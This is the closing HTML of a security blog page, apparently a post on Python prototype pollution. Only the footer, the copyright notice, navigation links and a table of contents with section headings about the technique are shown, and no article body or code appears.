+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/12855/">https://4reexile.github.io/article/12855/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/ctfshow-webbasic-rce-2/" title="Web入门_命令执行_2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Web入门_命令执行_2</div></div></a></div><div class="next-post pull-right"><a href="/article/ctfshow-webbasic-rce-1/" title="Web入门_命令执行_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Web入门_命令执行_1</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">是什么</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">例子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">获取目标类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%88%B6%E7%B1%BB"><span class="toc-number">4.1.</span> <span class="toc-text">获取父类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">4.2.</span> <span class="toc-text">获取全局变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97"><span class="toc-number">4.3.</span> <span class="toc-text">获取其他模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#import%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.3.1.</span> <span class="toc-text">import加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.3.2.</span> <span class="toc-text">sys模块加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8loader%E8%8E%B7%E5%8F%96sys"><span class="toc-number">4.3.3.</span> <span class="toc-text">加载器loader获取sys</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#spec%E8%8E%B7%E5%8F%96sys"><span class="toc-number">4.3.4.</span> <span class="toc-text">spec获取sys</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%BD%A2%E5%8F%82%E9%BB%98%E8%AE%A4%E5%80%BC%E6%9B%BF%E6%8D%A2"><span class="toc-number">5.1.</span> <span class="toc-text">函数形参默认值替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%E6%9B%BF%E6%8D%A2"><span class="toc-number">5.2.</span> <span class="toc-text">关键信息替换</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E5%AF%86%E9%92%A5%E6%9B%BF%E6%8D%A2"><span class="toc-number">5.2.1.</span> <span class="toc-text">flask密钥替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#got-first-request"><span class="toc-number">5.2.2.</span> <span class="toc-text">_got_first_request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#static-url-path"><span class="toc-number">5.2.3.</span> <span class="toc-text">_static_url_path:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">其他</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
